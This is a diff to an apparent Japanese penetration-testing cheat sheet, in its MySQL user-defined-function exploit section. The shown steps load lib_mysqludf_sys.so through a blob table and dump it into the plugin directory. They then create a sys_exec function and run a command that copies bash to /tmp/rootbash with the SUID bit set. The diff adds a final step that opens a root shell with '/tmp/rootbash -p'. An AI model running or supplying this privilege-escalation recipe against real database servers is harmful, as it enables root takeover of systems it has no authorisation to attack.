@@ -133,7 +133,7 @@ SELECT table_name, column_name, table_schema FROM information_schema.columns WHE
 
 ## MySQL UDF Exploit
 
-ユーザー定義関数（UDF）を悪用して OS 上でコマンドを実行する。
+ユーザー定義関数（UDF）を悪用して OS 上でコマンドを実行し、権限昇格する。
 
 ### エクスプロイトの前提条件
 
@@ -147,7 +147,7 @@ SELECT table_name, column_name, table_schema FROM information_schema.columns WHE
 ```sql
 USE mysql;
 CREATE TABLE npn(line blob);
-INSERT INTO npn VALUES(LOAD_FILE('/tmp/lib_mysqludf_sys.so'));
+INSERT INTO npn VALUES(LOAD_FILE('<path_to_lib_mysqludf_sys.so>'));
 ```
 
 2. ライブラリを `plugin_dir` へ出力する
@@ -163,6 +163,11 @@ SELECT * FROM npn INTO DUMPFILE '<plugin_dir_path>/lib_mysqludf_sys.so';
 CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys.so';
 -- 実行例：bashのSUID化によるroot奪取
 SELECT sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+```
+
+4. root権限でシェルを開く
+```sh
+/tmp/rootbash -p
 ```
 
 ---
